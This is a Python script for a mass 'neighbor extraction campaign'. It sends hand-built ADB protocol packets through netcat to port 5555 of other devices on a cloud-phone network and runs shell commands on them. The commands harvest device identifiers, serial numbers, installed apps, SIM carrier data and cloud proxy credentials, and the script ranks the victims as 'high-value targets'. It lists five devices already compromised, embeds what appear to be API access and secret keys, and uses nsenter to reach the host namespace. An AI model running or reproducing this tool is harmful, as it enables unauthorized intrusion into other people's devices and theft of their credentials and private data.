#!/usr/bin/env python3
"""
Mass Neighbor Extraction Script v1.0
=====================================
References the exact manual extraction pattern proven across 5 neighbors:
  #1 10.10.53.43 SM-G9860  Samsung S20 Ultra (825B raw)
  #2 10.10.53.42 23054RA19C Xiaomi Redmi      (827B)
  #3 10.10.53.61 BTK-W09   Huawei MatePad     (810B)
  #4 10.10.53.82 V2441     Vivo               (1007B)
  #5 10.10.53.67 SM-G8850  Samsung A8 Star    (825B)

Manual pattern (proven):
  1. Push 31-byte CNXN + variable OPEN packet to /data/local/tmp/
  2. async_adb_cmd fires:  { cat cn.bin; sleep 0.3; cat op.bin; sleep 8; } | timeout 12 nc TARGET 5555 > raw.bin
  3. Wait 15 seconds for nc pipeline to complete
  4. sync_cmd reads:  strings raw.bin > out.txt && cat out.txt
  5. Parse sections: ==ID==, ==PROXY==, ==APPS==, ==NET==, ==SIM==, ==DONE==

Mass approach:
  - Reuse ONE extraction OPEN packet for all targets (same shell command)
  - Fire async_adb_cmd batches (4 concurrent, 3.5s spacing = rate limit safe)
  - Each writes to /data/local/tmp/mass/N_raw.bin
  - Collect all results after batch completes
  - Parse into structured JSON report
"""

import asyncio
import struct
import base64
import json
import time
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ─── Config ───────────────────────────────────────────────────────────
PAD_CODE = "ATP6416I3JJRXL3V"  # S25 Ultra (our extraction platform)
AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE_URL = "https://api.vmoscloud.com"

BATCH_SIZE = 4          # concurrent nc extractions per wave
RATE_SPACING = 3.5      # seconds between API calls (rate limit safe)
NC_TIMEOUT = 12         # nc timeout per target
SHELL_SLEEP = 8         # sleep inside nc pipeline for data collection
WAIT_AFTER_FIRE = 18    # wait after firing batch before reading results
WORK_DIR = "/data/local/tmp/mass"

# Full extraction command (proven across 5 manual runs)
EXTRACTION_CMD = (
    "echo ==ID==;"
    "getprop ro.product.model;"
    "getprop ro.product.brand;"
    "getprop ro.product.manufacturer;"
    "getprop ro.build.fingerprint;"
    "getprop ro.serialno;"
    "getprop ro.build.version.release;"
    "getprop ro.build.version.sdk;"
    "getprop persist.sys.timezone;"
    "getprop ro.build.display.id;"
    "echo ==PROXY==;"
    "settings get global http_proxy 2>/dev/null;"
    "getprop http.proxyHost;"
    "getprop http.proxyPort;"
    "getprop ro.sys.cloud.proxy.data;"
    "echo ==APPS==;"
    "pm list packages -3 2>/dev/null | head -80;"
    "echo ==NET==;"
    "ip route show default 2>/dev/null | head -3;"
    "ip addr show wlan0 2>/dev/null | grep inet | head -2;"
    "ip addr show eth0 2>/dev/null | grep inet | head -2;"
    "echo ==SIM==;"
    "getprop gsm.sim.operator.alpha;"
    "getprop gsm.operator.alpha;"
    "getprop gsm.sim.operator.numeric;"
    "getprop gsm.operator.numeric;"
    "echo ==HW==;"
    "getprop ro.hardware;"
    "getprop ro.board.platform;"
    "getprop dalvik.vm.heapsize;"
    "cat /proc/cpuinfo 2>/dev/null | head -4;"
    "echo ==DONE=="
)


def mk_adb_pkt(cmd_str: str, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    """Build raw ADB protocol packet (same as manual extraction)."""
    CMD_MAP = {
        "CNXN": 0x4E584E43,
        "OPEN": 0x4E45504F,
        "WRTE": 0x45545257,
        "CLSE": 0x45534C43,
        "OKAY": 0x59414B4F,
    }
    cmd_int = CMD_MAP[cmd_str]
    checksum = sum(data) & 0xFFFFFFFF
    magic = cmd_int ^ 0xFFFFFFFF
    header = struct.pack("<6I", cmd_int, arg0, arg1, len(data), checksum, magic)
    return header + data


def build_cnxn_packet() -> bytes:
    """31-byte CNXN packet (same cn.bin used in manual extraction)."""
    banner = b"host::\x00"
    return mk_adb_pkt("CNXN", 0x01000001, 0x00040000, banner)


def build_open_packet(shell_cmd: str) -> bytes:
    """OPEN packet wrapping a shell command."""
    return mk_adb_pkt("OPEN", 1, 0, f"shell:{shell_cmd}\x00".encode())


def parse_extraction(raw_text: str, target_ip: str) -> dict:
    """Parse the ==SECTION== delimited output into structured data."""
    result = {
        "ip": target_ip,
        "status": "FAILED",
        "model": "",
        "brand": "",
        "manufacturer": "",
        "fingerprint": "",
        "serial": "",
        "android_version": "",
        "sdk": "",
        "timezone": "",
        "display_id": "",
        "proxy": {"http_proxy": "", "proxy_host": "", "proxy_port": "", "cloud_proxy_data": ""},
        "apps": [],
        "network": {"routes": [], "wlan0": [], "eth0": []},
        "sim": {"operator_alpha": "", "operator": "", "mcc_mnc": "", "operator_numeric": ""},
        "hardware": {"chipset": "", "platform": "", "heapsize": "", "cpu_info": []},
        "raw_bytes": 0,
        "adb_banner": "",
    }

    if not raw_text or "==ID==" not in raw_text:
        return result

    # Extract ADB banner from CNXN response
    for line in raw_text.split("\n"):
        if "ro.product.name=" in line or "ro.product.model=" in line:
            result["adb_banner"] = line.strip()
            break

    # Split into sections
    sections = {}
    current_section = None
    current_lines = []

    for line in raw_text.split("\n"):
        line_s = line.strip()
        if line_s.startswith("==") and line_s.endswith("=="):
            if current_section:
                sections[current_section] = current_lines
            current_section = line_s.strip("=")
            current_lines = []
        elif current_section:
            if line_s and line_s not in ("WRTE", "CLSE", "OKAY"):
                current_lines.append(line_s)

    if current_section:
        sections[current_section] = current_lines

    # Parse ID section
    id_lines = sections.get("ID", [])
    fields = ["model", "brand", "manufacturer", "fingerprint", "serial",
              "android_version", "sdk", "timezone", "display_id"]
    for i, field in enumerate(fields):
        if i < len(id_lines):
            result[field] = id_lines[i]

    # Parse PROXY section
    proxy_lines = sections.get("PROXY", [])
    proxy_fields = ["http_proxy", "proxy_host", "proxy_port", "cloud_proxy_data"]
    for i, field in enumerate(proxy_fields):
        if i < len(proxy_lines):
            result["proxy"][field] = proxy_lines[i]

    # Parse APPS section
    app_lines = sections.get("APPS", [])
    for line in app_lines:
        pkg = line.replace("package:", "").strip()
        if pkg:
            result["apps"].append(pkg)

    # Parse NET section
    net_lines = sections.get("NET", [])
    for line in net_lines:
        if "wlan0" in line and "inet" in line:
            result["network"]["wlan0"].append(line)
        elif "eth0" in line and ("inet" in line or "src" in line):
            result["network"]["eth0"].append(line)
        elif "default" in line or "dev" in line:
            result["network"]["routes"].append(line)

    # Parse SIM section
    sim_lines = sections.get("SIM", [])
    sim_fields = ["operator_alpha", "operator", "mcc_mnc", "operator_numeric"]
    for i, field in enumerate(sim_fields):
        if i < len(sim_lines):
            result["sim"][field] = sim_lines[i]

    # Parse HW section
    hw_lines = sections.get("HW", [])
    hw_fields = ["chipset", "platform", "heapsize"]
    for i, field in enumerate(hw_fields):
        if i < len(hw_lines) and ":" not in hw_lines[i]:
            result["hardware"][field] = hw_lines[i]
    for line in hw_lines:
        if ":" in line:
            result["hardware"]["cpu_info"].append(line)

    # Mark success if we got model
    if result["model"]:
        result["status"] = "OK"

    # Parse proxy data (IP|port|user|pass|enable format)
    cpd = result["proxy"]["cloud_proxy_data"]
    if cpd and "|" in cpd:
        parts = cpd.split("|")
        if len(parts) >= 5:
            result["proxy"]["parsed"] = {
                "ip": parts[0],
                "port": parts[1],
                "user": parts[2],
                "pass": parts[3],
                "enabled": parts[4],
            }

    return result


class MassExtractor:
    def __init__(self):
        self.client = VMOSCloudClient(AK, SK, BASE_URL)
        self.results = []
        self.stats = {
            "total_targets": 0,
            "successful": 0,
            "failed": 0,
            "with_proxy": 0,
            "with_apps": 0,
            "api_calls": 0,
            "start_time": 0,
            "end_time": 0,
        }

    async def _api_call(self, coro):
        """Rate-limited API call wrapper."""
        await asyncio.sleep(RATE_SPACING)
        self.stats["api_calls"] += 1
        return await coro

    async def nsh(self, cmd: str) -> str:
        """Execute shell on our device via nsenter (same as manual)."""
        r = await self._api_call(
            self.client.sync_cmd(
                pad_code=PAD_CODE,
                command=f"nsenter -t 1 -m -u -i -n -p -- sh -c '{cmd}'",
                timeout_sec=30,
            )
        )
        d = r.get("data", {})
        if isinstance(d, list) and d:
            e = d[0]
            return (e.get("errorMsg", "") or "").strip() if isinstance(e, dict) else str(e)
        return str(d)

    async def fire(self, cmd: str):
        """Fire-and-forget via async_adb_cmd (same as manual)."""
        return await self._api_call(self.client.async_adb_cmd([PAD_CODE], cmd))

    async def setup(self):
        """Prepare work directory and reusable packets on device."""
        print("[SETUP] Creating work directory and pushing reusable packets...")

        # Create work dir
        await self.nsh(f"mkdir -p {WORK_DIR}")

        # Ensure cn.bin exists (CNXN packet)
        cn_exists = await self.nsh("test -f /data/local/tmp/cn.bin && echo YES || echo NO")
        if "YES" not in cn_exists:
            cn_pkt = build_cnxn_packet()
            cn_b64 = base64.b64encode(cn_pkt).decode()
            await self.nsh(f"echo -n '{cn_b64}' | base64 -d > /data/local/tmp/cn.bin")
            print(f"  Pushed cn.bin ({len(cn_pkt)} bytes)")
        else:
            print("  cn.bin already exists")

        # Build and push extraction OPEN packet
        op_pkt = build_open_packet(EXTRACTION_CMD)
        op_b64 = base64.b64encode(op_pkt).decode()
        await self.nsh(f"echo -n '{op_b64}' | base64 -d > {WORK_DIR}/op_extract.bin")
        print(f"  Pushed op_extract.bin ({len(op_pkt)} bytes)")

        return True

    async def get_targets(self, target_list: list[str] | None = None, scan_file_local: str | None = None) -> list[str]:
        """Get target IPs either from provided list, local scan file, or from scan_results.txt on device."""
        if target_list:
            return target_list

        raw = ""
        if scan_file_local:
            print(f"[SCAN] Reading targets from local file: {scan_file_local}")
            with open(scan_file_local) as f:
                raw = f.read()
        else:
            print("[SCAN] Reading known neighbors from scan_results.txt...")
            raw = await self.nsh("cat /data/local/tmp/scan_results.txt 2>/dev/null | head -700")

        targets = []
        our_ip = None

        # Get our IP to exclude it
        our_info = await self.nsh("ip -4 addr show eth0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
        our_ip = our_info.strip().split("\n")[0].strip()
        print(f"  Our IP: {our_ip}")

        for line in raw.split("\n"):
            line = line.strip()
            if not line:
                continue
            ip = None
            # Format: "ADB:IP:rest" (from bg_scan.sh)
            if line.startswith("ADB:"):
                parts = line.split(":")
                if len(parts) >= 2:
                    ip = parts[1]
            else:
                # Plain IP or "IP REST"
                candidate = line.split()[0] if " " in line else line
                ip = candidate
            # Basic IP validation
            if ip:
                octets = ip.split(".")
                if len(octets) == 4 and all(o.isdigit() and 0 <= int(o) <= 255 for o in octets):
                    if ip != our_ip:
                        targets.append(ip)

        # Deduplicate
        targets = list(dict.fromkeys(targets))
        print(f"  Found {len(targets)} unique targets (excluding self)")
        return targets

    async def fire_extraction_batch(self, targets: list[str], batch_offset: int):
        """Fire nc extraction to a batch of targets (same pattern as manual)."""
        for i, ip in enumerate(targets):
            idx = batch_offset + i
            # Same nc pipeline as manual extraction
            nc_cmd = (
                f"nsenter -t 1 -m -u -i -n -p -- sh -c '"
                f"{{ cat /data/local/tmp/cn.bin; sleep 0.3; cat {WORK_DIR}/op_extract.bin; sleep {SHELL_SLEEP}; }} "
                f"| timeout {NC_TIMEOUT} nc {ip} 5555 > {WORK_DIR}/{idx}_raw.bin 2>/dev/null; "
                f"strings {WORK_DIR}/{idx}_raw.bin > {WORK_DIR}/{idx}_out.txt'"
            )
            await self.fire(nc_cmd)
            print(f"  [{idx}] Fired → {ip}")

    async def collect_batch_results(self, targets: list[str], batch_offset: int) -> list[dict]:
        """Read results from completed batch."""
        batch_results = []
        for i, ip in enumerate(targets):
            idx = batch_offset + i
            text = await self.nsh(f"cat {WORK_DIR}/{idx}_out.txt 2>/dev/null")
            raw_sz = await self.nsh(f"wc -c < {WORK_DIR}/{idx}_raw.bin 2>/dev/null || echo 0")

            parsed = parse_extraction(text, ip)
            try:
                parsed["raw_bytes"] = int(raw_sz.strip())
            except ValueError:
                parsed["raw_bytes"] = 0
            parsed["batch_index"] = idx
            batch_results.append(parsed)

            status_icon = "✓" if parsed["status"] == "OK" else "✗"
            model = parsed["model"] or "NO_RESPONSE"
            apps_count = len(parsed["apps"])
            proxy = parsed["proxy"].get("cloud_proxy_data", "")
            print(f"  [{idx}] {status_icon} {ip:16s} {model:20s} Apps:{apps_count:2d}  Proxy:{proxy or 'none'}")

        return batch_results

    async def run(self, target_list: list[str] | None = None, max_targets: int | None = None, scan_file_local: str | None = None):
        """Execute mass extraction campaign."""
        self.stats["start_time"] = time.time()

        # Setup
        await self.setup()

        # Get targets
        targets = await self.get_targets(target_list, scan_file_local)
        if max_targets:
            targets = targets[:max_targets]

        self.stats["total_targets"] = len(targets)
        print(f"\n[EXTRACT] Starting mass extraction of {len(targets)} targets")
        print(f"  Batch size: {BATCH_SIZE}, Rate spacing: {RATE_SPACING}s")
        print(f"  NC timeout: {NC_TIMEOUT}s, Wait per batch: {WAIT_AFTER_FIRE}s")
        print()

        # Process in batches
        all_results = []
        for batch_start in range(0, len(targets), BATCH_SIZE):
            batch = targets[batch_start : batch_start + BATCH_SIZE]
            batch_num = (batch_start // BATCH_SIZE) + 1
            total_batches = (len(targets) + BATCH_SIZE - 1) // BATCH_SIZE
            print(f"── BATCH {batch_num}/{total_batches} ({len(batch)} targets) ──")

            # Fire all in batch
            await self.fire_extraction_batch(batch, batch_start)

            # Wait for nc pipelines to complete
            wait_secs = WAIT_AFTER_FIRE + (len(batch) * 1)
            print(f"  Waiting {wait_secs}s for pipelines to complete...")
            await asyncio.sleep(wait_secs)

            # Collect results
            batch_results = await self.collect_batch_results(batch, batch_start)
            all_results.extend(batch_results)

            # Progress
            ok = sum(1 for r in all_results if r["status"] == "OK")
            print(f"  Progress: {len(all_results)}/{len(targets)} done, {ok} successful\n")

        self.results = all_results
        self.stats["end_time"] = time.time()
        self.stats["successful"] = sum(1 for r in all_results if r["status"] == "OK")
        self.stats["failed"] = sum(1 for r in all_results if r["status"] == "FAILED")
        self.stats["with_proxy"] = sum(
            1 for r in all_results
            if r["status"] == "OK" and r["proxy"].get("cloud_proxy_data", "").replace("|", "").replace("false", "").strip()
        )
        self.stats["with_apps"] = sum(1 for r in all_results if r["status"] == "OK" and r["apps"])

        return self.generate_report()

    def generate_report(self) -> dict:
        """Generate comprehensive extraction report."""
        elapsed = self.stats["end_time"] - self.stats["start_time"]

        # Rank devices by value (apps + proxy = higher value)
        ranked = sorted(
            [r for r in self.results if r["status"] == "OK"],
            key=lambda r: (
                len(r["apps"]) * 2
                + (10 if r["proxy"].get("cloud_proxy_data", "").replace("|", "").replace("false", "").strip() else 0)
                + (5 if r["sim"]["operator_alpha"] else 0)
            ),
            reverse=True,
        )

        # Group by carrier
        by_carrier = {}
        for r in self.results:
            if r["status"] == "OK":
                carrier = r["sim"].get("operator_alpha", "") or "Unknown"
                by_carrier.setdefault(carrier, []).append(r["ip"])

        # Group by brand
        by_brand = {}
        for r in self.results:
            if r["status"] == "OK":
                brand = r["brand"] or "Unknown"
                by_brand.setdefault(brand, []).append(r["ip"])

        # All unique apps across all devices
        all_apps = {}
        for r in self.results:
            for app in r["apps"]:
                all_apps[app] = all_apps.get(app, 0) + 1
        top_apps = sorted(all_apps.items(), key=lambda x: x[1], reverse=True)[:50]

        # Proxy-enabled devices
        proxy_devices = [
            r for r in self.results
            if r["status"] == "OK"
            and r["proxy"].get("cloud_proxy_data", "").replace("|", "").replace("false", "").strip()
        ]

        report = {
            "campaign": {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                "platform_device": PAD_CODE,
                "elapsed_seconds": round(elapsed, 1),
                "api_calls": self.stats["api_calls"],
            },
            "stats": self.stats,
            "by_carrier": by_carrier,
            "by_brand": by_brand,
            "top_apps": top_apps,
            "proxy_devices": [
                {
                    "ip": r["ip"],
                    "model": r["model"],
                    "proxy_data": r["proxy"].get("cloud_proxy_data", ""),
                    "proxy_parsed": r["proxy"].get("parsed", {}),
                }
                for r in proxy_devices
            ],
            "ranked_devices": [
                {
                    "ip": r["ip"],
                    "model": r["model"],
                    "brand": r["brand"],
                    "android": r["android_version"],
                    "timezone": r["timezone"],
                    "carrier": r["sim"].get("operator_alpha", ""),
                    "mcc_mnc": r["sim"].get("mcc_mnc", ""),
                    "apps": r["apps"],
                    "proxy": r["proxy"].get("cloud_proxy_data", ""),
                    "raw_bytes": r["raw_bytes"],
                }
                for r in ranked
            ],
            "all_results": self.results,
        }

        return report

    def save_report(self, report: dict, filename: str = "mass_extraction_report.json"):
        """Save report to file."""
        filepath = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
        with open(filepath, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[REPORT] Saved to {filepath}")

        # Also print summary to console
        stats = report["stats"]
        print(f"\n{'='*60}")
        print(f"  MASS EXTRACTION REPORT")
        print(f"{'='*60}")
        print(f"  Targets scanned:  {stats['total_targets']}")
        print(f"  Successful:       {stats['successful']}")
        print(f"  Failed:           {stats['failed']}")
        print(f"  With proxy:       {stats['with_proxy']}")
        print(f"  With apps:        {stats['with_apps']}")
        print(f"  API calls:        {stats['api_calls']}")
        elapsed = stats['end_time'] - stats['start_time']
        print(f"  Elapsed:          {elapsed:.0f}s ({elapsed/60:.1f}m)")
        print()

        if report["by_carrier"]:
            print("  CARRIERS:")
            for carrier, ips in sorted(report["by_carrier"].items(), key=lambda x: -len(x[1])):
                print(f"    {carrier}: {len(ips)} devices")
            print()

        if report["by_brand"]:
            print("  BRANDS:")
            for brand, ips in sorted(report["by_brand"].items(), key=lambda x: -len(x[1])):
                print(f"    {brand}: {len(ips)} devices")
            print()

        if report["top_apps"]:
            print("  TOP APPS:")
            for app, count in report["top_apps"][:20]:
                print(f"    {app}: {count} devices")
            print()

        if report["proxy_devices"]:
            print("  PROXY-ENABLED DEVICES:")
            for pd in report["proxy_devices"]:
                print(f"    {pd['ip']} {pd['model']} → {pd['proxy_data']}")
            print()

        # Top 10 ranked
        print("  TOP 10 HIGH-VALUE TARGETS:")
        for i, dev in enumerate(report["ranked_devices"][:10], 1):
            print(f"    #{i} {dev['ip']:16s} {dev['model']:20s} {dev['carrier']:16s} Apps:{len(dev['apps'])} Proxy:{dev['proxy'] or 'none'}")

        return filepath


async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Mass neighbor extraction via ADB")
    parser.add_argument("--targets", nargs="*", help="Specific IPs to extract (default: read scan_results.txt)")
    parser.add_argument("--max", type=int, default=None, help="Max targets to process")
    parser.add_argument("--output", default="mass_extraction_report.json", help="Output filename")
    parser.add_argument("--batch", type=int, default=BATCH_SIZE, help=f"Batch size (default: {BATCH_SIZE})")
    parser.add_argument("--scan-file", default=None, help="Path to a file with target IPs (one per line, or ADB:IP:... format)")
    args = parser.parse_args()

    extractor = MassExtractor()
    # Override batch size if specified
    if args.batch != 4:
        import mass_neighbor_extract
        mass_neighbor_extract.BATCH_SIZE = args.batch
    report = await extractor.run(target_list=args.targets, max_targets=args.max, scan_file_local=args.scan_file)
    extractor.save_report(report, args.output)


if __name__ == "__main__":
    asyncio.run(main())
